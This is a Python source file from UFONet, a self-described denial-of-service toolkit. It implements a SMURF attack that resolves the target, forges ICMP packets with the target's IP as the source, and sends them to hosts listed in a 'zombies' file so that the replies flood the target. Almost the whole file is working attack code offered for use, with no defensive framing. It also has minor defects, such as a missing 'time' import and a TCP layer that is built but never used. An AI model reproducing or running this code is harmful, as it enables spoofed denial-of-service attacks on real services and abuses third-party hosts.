#!/usr/bin/env python 
# -*- coding: utf-8 -*-"
"""
UFONet - Denial of Service Toolkit - 2018 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, urlparse

try:
    from scapy.all import *
except:
    print "\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python-scapy' or 'pip install scapy'\n"
    sys.exit(2)

# UFONet ICMP broadcast attack (SMURF)
def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def sIP(base_stations): # extract 'base stations'
    bs = {}
    s_zombie = random.choice(base_stations).strip() # shuffle 'base stations'
    if not s_zombie in bs:
        try:
            s_zombie_ip = socket.gethostbyname(s_zombie)
            bs[s_zombie] = s_zombie_ip # add to dict of resolved domains
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(s_zombie)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    s_zombie_ip = str(rd)
                bs[s_zombie] = s_zombie_ip # add to dict of resolved domains
            except:
                s_zombie_ip = s_zombie
    else:
        s_zombie_ip = bs.get(s_zombie)
    return s_zombie_ip

def smurfize(ip, sport, rounds):
    f = open('botnet/zombies.txt') # use 'zombies' as 'base stations'
    base_stations = f.readlines()
    base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
    f.close()
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            s_zombie_ip = sIP(base_stations)
            if s_zombie_ip == None: # not any 'base stations' available
                print "[Error] [AI] [SMURF] Imposible to retrieve 'base stations' -> [Aborting!]\n"
                break
            seq = randInt()
            window = randInt()
            IP_p = IP()
            try:
                IP_p.src = ip # ICMP 'broadcast' package carring fraudulent (spoofed) source IP belonging to target (aka SMURF attack)
            except:
                print "[Error] [AI] [SMURF] Imposible to resolve IP from target! -> [Aborting!]\n"
                break
            try:
                IP_p.dst = s_zombie_ip
            except:
                print "[Error] [AI] [SMURF] Imposible to resolve IP from 'base station' -> [Aborting!]\n"
                break
            TCP_l = TCP()
            TCP_l.sport = sport
            TCP_l.dport = sport
            TCP_l.seq = seq
            TCP_l.window = window
            try:
                send(IP_p/ICMP(), verbose=0)
                print "[Info] [AI] [SMURF] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]"
                time.sleep(1) # sleep time required for balanced sucess
            except:
                print "[Error] [AI] [SMURF] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"]"
    except:
        print("[Error] [AI] [SMURF] Failing to engage... -> Is still target online? -> [Checking!]")

class SMURF(object):
    def attacking(self, target, rounds):
        print "[Info] [AI] ICMP Broadcast (SMURF) is redirecting: [" , rounds, "base stations ]"
        if target.startswith('http://'):
            target = target.replace('http://','')
            sport = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            sport = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print "[Info] [AI] [SMURF] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n"
            return
        smurfize(ip, sport, rounds) # attack with SMURF using threading
